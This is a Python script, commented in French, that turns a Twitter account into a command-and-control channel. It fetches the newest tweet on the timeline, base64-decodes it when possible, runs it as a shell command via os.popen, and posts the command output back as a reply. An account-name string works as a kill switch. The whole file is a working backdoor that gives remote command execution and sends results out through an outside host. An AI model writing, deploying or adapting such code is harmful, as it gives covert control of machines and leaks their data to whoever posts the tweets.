#!/usr/bin/python3
# -*- coding: utf-8 -*
import tweepy, os, time, base64

#delai de 10min avant de rentrer dans la boucle
# time.sleep(600)

#import des constante
consumer_key = ''
consumer_secret = ''
access_token = ''
access_token_secret = ''

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)
api = tweepy.API(auth)

while True:
    #killswitch
    killswitch = api.me().name
    if killswitch == 'Putain de bot':

        #recuper le dernier tweet
        last_tweet = api.home_timeline()[0]
        last_tweet_id = last_tweet.id

        #si base64 le decode
        message = last_tweet.text
        try:
            decodeMessage = base64.b64decode(message)
            last_tweet_text = str(decodeMessage, 'utf-8')
        #sinon l'execute tel quel
        except:
            last_tweet_text = message

        #essaye d'executer le dernier tweet
        resp = os.popen(last_tweet_text).read()
        if last_tweet_text != 'first':
            #si le retour n'est pas vide, le renvoi et ajoute un message (au cas ou le retour est lui meme executable)
            if resp != '':
                api.update_status(resp, last_tweet_id)
                api.update_status('first', last_tweet_id)
            #si le retour est vide (non executable ou pas de retour ecrit) renvoi un message pour eviter la boucle
            else:
                api.update_status('first', last_tweet_id)
        #ajout d'un delai pour eviter de surcharger l'api twitter
        time.sleep(60)
        
    #si le killswitch n'est plus actif, kill le script
    else:
        exit()
